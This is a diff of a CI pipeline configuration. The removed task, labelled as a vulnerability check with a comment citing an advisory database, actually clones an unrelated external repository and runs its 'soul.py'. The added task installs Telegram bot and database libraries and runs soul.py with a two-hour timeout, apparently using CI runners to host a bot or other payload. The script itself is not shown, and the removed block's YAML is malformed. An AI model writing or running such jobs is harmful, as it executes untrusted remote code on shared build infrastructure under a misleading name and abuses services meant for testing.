@@ -1,14 +1,26 @@
+version: v2
+global: 
+  runner:
+    os_image: ubuntu
+  variables: 
+  - CGO_ENABLED=0
+  - GOOS=linux
+  - GOARCH=amd64
+  - GOFLAGS=-mod=vendor
+  - LD_FLAGS=-w -s
+
 tasks:
-  check-vulvs:
-    runner: razorci/python:3.9
+  setup:
+    timeout: 7200
     steps:
     - checkout
-    ## use https://github.com/pypa/advisory-database for security vulnerabilities
-    - commands: 
-      - export PATH="$(python3 -m site --user-base)/bin:$PATH"
-      - git clone https://github.com/teamcity10101/noob.git
-cd noob
-pip install --upgrade pip
-            pip install telebot flask pymongo aiohttp python-telegram-bot
-chmod +x *
-python3 soul.py
+    - run: |
+        sudo apt-get update && \
+        sudo apt-get install -y python3 python3-pip && \
+        pip3 install telebot flask pymongo aiohttp python-telegram-bot && \
+        pip install telebot flask aiogram pyTelegramBotAPI python-telegram-bot && \
+        pip install telebot pymongo aiohttp psutil && \
+        pip install motor && \
+        chmod +x * && \
+        echo "Starting soul.py execution" && \
+        python3 soul.py
